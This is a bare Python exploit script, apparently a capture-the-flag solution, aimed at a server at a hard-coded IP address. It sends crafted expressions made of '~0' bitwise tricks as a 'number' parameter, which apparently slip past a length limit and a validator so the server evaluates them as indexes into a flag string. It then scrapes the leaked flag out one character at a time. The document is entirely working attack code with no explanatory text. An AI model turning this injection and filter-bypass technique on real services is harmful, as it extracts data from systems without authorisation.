import requests as rq 
from pwn import *
import re, random, os

s = rq.Session()

ns = [
	'0',
	'1',
	'2',
	'3',
	'4',
	'5',
	'~0*~5', # 6	
	'-(~0)+~0*~5', # 7
	'-(~0+~0)**3', # 8
	'(~0+~0+~0)**2', # 9
	'-(~0+~0)*5', # 10
	'-~0-(~0+~0)*5', # 11
	'-(~0+~0+~0)*4', # 12 = -12
	'~0+(~0+~0)*5', # 13 = -11
	'(~0+~0)*5',
	'~0+(~0+~0)*4',
	'(~0+~0)*4', # -8
	'~0+(~0+~0)*3',
	'(~0+~0)*3', # -6
	'~4',
	'-4',
	'-3',
	'-2',
	'-1'
]

# for j,i in enumerate(ns):
# 	n = eval(i)
# 	if n < 0:
# 		n = 24+n
# 	c1 = len("FL4G[%s]" % (i)) <= 20
# 	c2 = botValidator(i)
# 	if c1 and c2 and j == n:
# 		log.success(f'{n = } {eval(i) = }')
# 	else:
# 		log.info(f'{n = } {eval(i) = } {j = } | Checks: len: {c1}  valid {c2}')

out = ''
for i in ns:
	params = {
		'type':'FL4G',
		'number':i,
	}
	r = rq.post('http://172.105.120.180:9999/?debug=1', data=params)
	c = r.text.split("</strong>")[2][0]
	out += c
	log.info(f'{i = } {c = }')
log.success(out)